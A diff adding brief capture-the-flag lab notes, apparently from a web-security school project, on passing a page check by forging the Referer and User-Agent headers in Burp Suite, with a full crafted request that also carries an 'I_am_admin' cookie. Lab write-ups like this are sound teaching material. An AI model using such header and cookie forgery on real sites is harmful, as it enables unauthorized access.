@@ -1,0 +1,24 @@
+http://192.168.122.55/?page=e43ad1fdc54babe674da7c7b8f0127bde61de3fbe01def7d00f151c2fcca6d1c
+
+right clic -> examiner la cible -> read source code
+ 
+You must cumming from : "https://www.nsa.gov/" to go to the next step
+Let's use this browser : "ft_bornToSec". It will help you a lot.
+
+Referer == where i come from (previous page)
+User-Agent == my browser
+
+change the request using BurpSuite:
+	
+	GET /?page=e43ad1fdc54babe674da7c7b8f0127bde61de3fbe01def7d00f151c2fcca6d1c HTTP/1.1
+	Host: 192.168.122.55
+	User-Agent: ft_bornToSec
+	Referer: https://www.nsa.gov/
+	Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+	Accept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3
+	Accept-Encoding: gzip, deflate
+	Connection: close
+	Cookie: I_am_admin=68934a3e9455fa72420237eb05902327
+	Upgrade-Insecure-Requests: 1
+
+
